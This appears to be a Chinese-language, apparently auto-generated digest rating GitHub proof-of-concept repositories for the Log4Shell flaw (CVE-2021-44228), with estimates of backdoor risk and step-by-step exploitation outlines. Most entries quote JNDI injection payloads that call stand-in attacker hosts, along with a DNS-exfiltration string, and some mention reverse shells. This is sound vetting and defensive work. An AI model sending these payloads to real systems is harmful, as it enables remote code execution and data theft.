**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

